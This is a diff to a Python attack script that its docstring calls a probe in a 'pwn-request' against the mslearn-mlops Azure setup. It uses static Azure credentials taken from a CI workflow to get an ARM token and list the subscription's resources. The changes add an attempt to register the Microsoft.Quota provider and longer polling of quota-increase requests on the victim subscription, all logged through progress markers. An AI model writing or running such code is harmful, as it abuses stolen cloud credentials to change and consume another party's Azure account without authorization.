@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""C211 i120559 probe v10 (mslearn-mlops Azure pwn-request, continuation of i120447/i120316):
+"""C211 i120559 probe v11 (mslearn-mlops Azure pwn-request, continuation of i120447/i120316):
 - ARM token via azure/login static creds (az account get-access-token)
 - full RG resource inventory (names) + pre-clean of ONLY c211-* leftovers with 404 readback
 - PHASE B: Microsoft.Quota discovery (subscription scope + per-compute-location lists) for
@@ -14,7 +14,7 @@
 """
 import argparse, base64, json, os, random, re, string, subprocess, sys, time, urllib.request, urllib.error, urllib.parse
 
-INTENT = 'i120559'
+INTENT = 'i120559r2'
 def p(*a): print(*a, flush=True)
 def prog(step, **kw):
     try: p('C211_%s_PROGRESS ' % INTENT + json.dumps({'step': step, 't': time.strftime('%FT%TZ', time.gmtime()), **kw})[:3500])
@@ -411,6 +411,30 @@ def main():
     R['nv4as_v4_regions'] = nv4_regions
     prog('sku_nv4', regions=nv4_regions, entries=len(nv4), gpus=(nv4[0]['gpus'] if nv4 else None))
 
+    # ---- PHASE B0: Microsoft.Quota resource-provider state + ONE bounded registration attempt ----
+    stp, provs = jget(tok, f'{ARM}/subscriptions/{sub}/providers?api-version=2021-04-01')
+    rp = {}
+    for it in ((provs.get('value') or []) if stp == 200 else []):
+        ns = it.get('namespace')
+        if ns in ('Microsoft.Quota', 'Microsoft.Capacity'):
+            rp[ns] = it.get('registrationState')
+    R['rp_state'] = {'status': stp, 'quota': rp.get('Microsoft.Quota'), 'capacity': rp.get('Microsoft.Capacity')}
+    prog('rp_state', **R['rp_state'])
+    stq, reg, hreg = jcall(tok, 'POST', f'{ARM}/subscriptions/{sub}/providers/Microsoft.Quota/register?api-version=2021-04-01')
+    R['rp_register'] = {'status': stq, 'resp': json.dumps(reg)[:900] if isinstance(reg, dict) else str(reg)[:900],
+                        'async': hreg.get('Azure-AsyncOperation') or hreg.get('Location')}
+    prog('rp_register', **R['rp_register'])
+    regpoll = []
+    for i in range(8):
+        time.sleep(15)
+        st1, p1 = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Quota?api-version=2021-04-01')
+        state = (p1.get('registrationState') if isinstance(p1, dict) else None)
+        regpoll.append({'i': i, 'status': st1, 'state': state})
+        if state == 'Registered':
+            break
+    R['rp_registration_poll'] = regpoll
+    prog('rp_registration_poll', tail=regpoll[-3:])
+
     # ---- PHASE B: quota discovery ----
     Q = quota_discover(tok, sub, R)
     tgt = None
@@ -427,7 +451,7 @@ def main():
     else:
         quota_put(tok, sub, tgt, Q, R)
         try:
-            approved = quota_poll(tok, sub, tgt, Q, R)
+            approved = quota_poll(tok, sub, tgt, Q, R, max_iter=20, sleep_s=15)
         except Exception as e:
             prog('quota_poll_error', err=repr(e))
 
@@ -514,6 +538,7 @@ def emit(R):
                 'quota_put': Q.get('put'), 'quota_put_alt': Q.get('put_alt'), 'quota_put_legacy': Q.get('put_legacy'),
                 'quota_poll_tail': (Q.get('poll') or [])[-6:], 'quota_async_final': Q.get('async_final'),
                 'quota_requests': Q.get('requests'), 'quota_verdict': Q.get('verdict'),
+                'rp_state': R.get('rp_state'), 'rp_register': R.get('rp_register'), 'rp_registration_poll': R.get('rp_registration_poll'),
                 'marker': {k: (R.get('marker') or {}).get(k) for k in ('attempted', 'skipped', 'nonce', 'region', 'sku', 'priority',
                                                                        'provision_state', 'provisioned', 'instance_view_statuses',
                                                                        'runcommand_status', 'device_signals', 'device_evidence',
